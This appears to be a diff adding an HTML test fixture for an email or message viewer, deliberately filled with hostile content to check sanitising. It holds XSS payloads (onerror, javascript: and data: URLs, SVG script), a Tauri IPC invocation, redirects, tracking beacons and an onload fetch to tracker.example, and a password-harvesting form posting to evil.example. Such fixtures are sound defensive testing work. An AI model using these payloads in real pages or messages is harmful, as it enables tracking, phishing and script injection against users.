@@ -1,0 +1,22 @@
+<html><head>
+<script>window.__TAURI_INTERNALS__ && window.__TAURI_INTERNALS__.invoke("foundation_report")</script>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<link rel="stylesheet" href="https://tracker.example/style.css">
+<style>body { background: url(https://tracker.example/bg.png) }</style>
+</head><body onload="fetch('https://tracker.example/onload')">
+<h1>Hostile fixture</h1>
+<p style="background:url(https://tracker.example/inline.png)">Synthetic message for viewer tests.</p>
+<img src="https://tracker.example/pixel.gif" width="1" height="1">
+<img src="http://tracker.example/plain.gif">
+<img src="cid:logo@pigeon.test" alt="inline">
+<img src="data:image/png;base64,iVBORw0KGgo=" alt="embedded">
+<img src="x" onerror="alert(1)">
+<a href="javascript:alert(1)">js link</a>
+<a href="https://example.org/ok">normal link</a>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/x.swf"></object>
+<form action="https://evil.example/phish"><input name="password"></form>
+<svg><script>alert(1)</script></svg>
+<a href="data:text/html,<script>alert(1)</script>">data link</a>
+</body></html>
